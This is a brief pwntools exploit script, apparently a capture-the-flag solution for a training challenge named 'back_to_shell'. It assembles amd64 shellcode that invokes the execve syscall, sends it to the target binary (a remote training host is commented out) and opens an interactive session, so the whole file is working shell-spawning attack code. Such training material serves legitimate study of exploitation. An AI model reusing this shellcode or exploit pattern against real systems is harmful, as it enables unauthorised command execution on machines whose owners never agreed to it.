from pwn import *

asm_code = '''
mov rdi, rax
add rdi, 12
mov rax, 0x3b
syscall
nop
nop
nop
nop

'''

context.arch = 'amd64'


shellcode = asm(asm_code)
# shellcode = asm(shellcraft.sh())

p = process('./back_to_shell')
# p = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
p.send(shellcode)

p.interactive()

